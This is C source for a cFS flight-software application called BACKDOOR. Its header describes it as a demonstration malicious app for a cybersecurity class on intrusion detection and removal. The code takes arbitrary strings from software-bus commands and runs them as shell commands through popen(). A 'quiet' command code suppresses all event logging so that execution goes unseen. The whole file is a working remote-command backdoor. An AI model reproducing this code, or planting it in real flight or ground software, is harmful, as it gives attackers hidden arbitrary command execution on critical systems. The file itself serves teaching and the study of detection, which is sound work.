/*
** BACKDOOR - Demonstration malicious cFS application
**
** Accepts shell commands via the software bus and executes them.
** Output goes to EVS events and/or a file in /cf/.
** Used to demonstrate IPS detection and removal in a cybersecurity class.
**
** NOT FOR PRODUCTION USE.
*/

#include "backdoor_app.h"
#include "backdoor_perfids.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

BACKDOOR_AppData_t BACKDOOR_AppData;

static void BACKDOOR_ProcessCommand(void);
static void BACKDOOR_ProcessGroundCommand(void);
static void BACKDOOR_ReportHousekeeping(void);
static void BACKDOOR_ExecShellCmd(const char *cmd, int quiet);

void BACKDOOR_AppMain(void)
{
    int32 status;

    CFE_ES_PerfLogEntry(BACKDOOR_PERF_ID);

    BACKDOOR_AppData.RunStatus = CFE_ES_RunStatus_APP_RUN;

    status = CFE_EVS_Register(NULL, 0, CFE_EVS_EventFilter_BINARY);
    if (status != CFE_SUCCESS)
    {
        BACKDOOR_AppData.RunStatus = CFE_ES_RunStatus_APP_ERROR;
    }

    status = CFE_SB_CreatePipe(&BACKDOOR_AppData.CmdPipe, BACKDOOR_PIPE_DEPTH, "BACKDOOR_PIPE");
    if (status != CFE_SUCCESS)
    {
        BACKDOOR_AppData.RunStatus = CFE_ES_RunStatus_APP_ERROR;
    }

    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(BACKDOOR_CMD_MID), BACKDOOR_AppData.CmdPipe);
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(BACKDOOR_REQ_HK_MID), BACKDOOR_AppData.CmdPipe);

    CFE_MSG_Init(CFE_MSG_PTR(BACKDOOR_AppData.hk.TlmHeader),
                 CFE_SB_ValueToMsgId(BACKDOOR_HK_TLM_MID),
                 BACKDOOR_HK_TLM_LNGTH);

    BACKDOOR_AppData.hk.cmdCount = 0;
    BACKDOOR_AppData.hk.cmdErrCount = 0;
    BACKDOOR_AppData.hk.execCount = 0;

    CFE_EVS_SendEvent(BACKDOOR_STARTUP_EID, CFE_EVS_EventType_INFORMATION,
        "BACKDOOR: App started - shell command interface active");

    while (CFE_ES_RunLoop(&BACKDOOR_AppData.RunStatus) == true)
    {
        CFE_ES_PerfLogExit(BACKDOOR_PERF_ID);

        status = CFE_SB_ReceiveBuffer((CFE_SB_Buffer_t **)&BACKDOOR_AppData.MsgPtr,
                                       BACKDOOR_AppData.CmdPipe, CFE_SB_PEND_FOREVER);

        CFE_ES_PerfLogEntry(BACKDOOR_PERF_ID);

        if (status == CFE_SUCCESS)
        {
            BACKDOOR_ProcessCommand();
        }
    }

    CFE_ES_PerfLogExit(BACKDOOR_PERF_ID);
    CFE_ES_ExitApp(BACKDOOR_AppData.RunStatus);
}

static void BACKDOOR_ProcessCommand(void)
{
    CFE_SB_MsgId_t msgId = CFE_SB_INVALID_MSG_ID;
    CFE_MSG_GetMsgId(BACKDOOR_AppData.MsgPtr, &msgId);

    switch (CFE_SB_MsgIdToValue(msgId))
    {
        case BACKDOOR_CMD_MID:
            BACKDOOR_ProcessGroundCommand();
            break;
        case BACKDOOR_REQ_HK_MID:
            BACKDOOR_ReportHousekeeping();
            break;
        default:
            BACKDOOR_AppData.hk.cmdErrCount++;
            break;
    }
}

static void BACKDOOR_ProcessGroundCommand(void)
{
    CFE_MSG_FcnCode_t cmdCode = 0;
    CFE_MSG_GetFcnCode(BACKDOOR_AppData.MsgPtr, &cmdCode);

    switch (cmdCode)
    {
        case BACKDOOR_NOOP_CC:
            BACKDOOR_AppData.hk.cmdCount++;
            CFE_EVS_SendEvent(BACKDOOR_CMD_EID, CFE_EVS_EventType_INFORMATION,
                "BACKDOOR: NOOP - executions=%d", BACKDOOR_AppData.hk.execCount);
            break;

        case BACKDOOR_EXEC_CC:
        {
            BACKDOOR_ExecCmd_t *cmd = (BACKDOOR_ExecCmd_t *)BACKDOOR_AppData.MsgPtr;
            cmd->command[BACKDOOR_CMD_MAX_LEN - 1] = '\0';
            BACKDOOR_AppData.hk.cmdCount++;
            BACKDOOR_ExecShellCmd(cmd->command, 0);
            break;
        }

        case BACKDOOR_EXEC_QUIET_CC:
        {
            BACKDOOR_ExecCmd_t *cmd = (BACKDOOR_ExecCmd_t *)BACKDOOR_AppData.MsgPtr;
            cmd->command[BACKDOOR_CMD_MAX_LEN - 1] = '\0';
            BACKDOOR_AppData.hk.cmdCount++;
            BACKDOOR_ExecShellCmd(cmd->command, 1);
            break;
        }

        default:
            BACKDOOR_AppData.hk.cmdErrCount++;
            break;
    }
}

static void BACKDOOR_ExecShellCmd(const char *cmd, int quiet)
{
    FILE *fp;
    char output_line[120];

    BACKDOOR_AppData.hk.execCount++;

    if (!quiet)
    {
        CFE_EVS_SendEvent(BACKDOOR_EXEC_EID, CFE_EVS_EventType_INFORMATION,
            "BACKDOOR: Executing '%s'", cmd);
    }

    fp = popen(cmd, "r");
    if (fp == NULL)
    {
        if (!quiet)
        {
            CFE_EVS_SendEvent(BACKDOOR_ERR_EID, CFE_EVS_EventType_ERROR,
                "BACKDOOR: popen failed for '%s'", cmd);
        }
        return;
    }

    while (fgets(output_line, sizeof(output_line), fp) != NULL)
    {
        /* Strip trailing newline */
        size_t len = strlen(output_line);
        if (len > 0 && output_line[len - 1] == '\n')
            output_line[len - 1] = '\0';

        if (!quiet)
        {
            CFE_EVS_SendEvent(BACKDOOR_EXEC_EID, CFE_EVS_EventType_INFORMATION,
                "BACKDOOR> %s", output_line);
        }
    }

    pclose(fp);
}

static void BACKDOOR_ReportHousekeeping(void)
{
    CFE_SB_TimeStampMsg((CFE_MSG_Message_t *)&BACKDOOR_AppData.hk);
    CFE_SB_TransmitMsg((CFE_MSG_Message_t *)&BACKDOOR_AppData.hk, true);
}
